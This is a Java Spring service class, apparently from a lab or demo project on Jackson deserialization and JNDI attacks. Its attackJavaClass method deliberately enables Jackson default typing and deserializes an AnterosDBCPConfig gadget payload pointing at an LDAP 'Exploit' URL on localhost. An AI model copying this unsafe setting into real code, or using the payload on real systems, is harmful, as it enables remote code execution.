package keeper.log4j.attack.service;

import org.springframework.stereotype.Service;


import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

@Service
public class MainManageService {

  /**
   * 접속 아이피 표시
   */
  public String displayIP(){
    return "127.0.0.1";
  }

  /**
   * 취약한 자바 클래스
   */
  public void attackJavaClass(){
    ObjectMapper mapper = new ObjectMapper();

    mapper.enableDefaultTyping();

    String json = "[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\": \"ldap://localhost:1389/Exploit\"}]";
    try {
      mapper.readValue(json, Object.class);
    } catch (IOException e) {
      e.printStackTrace();
    }

  }
}
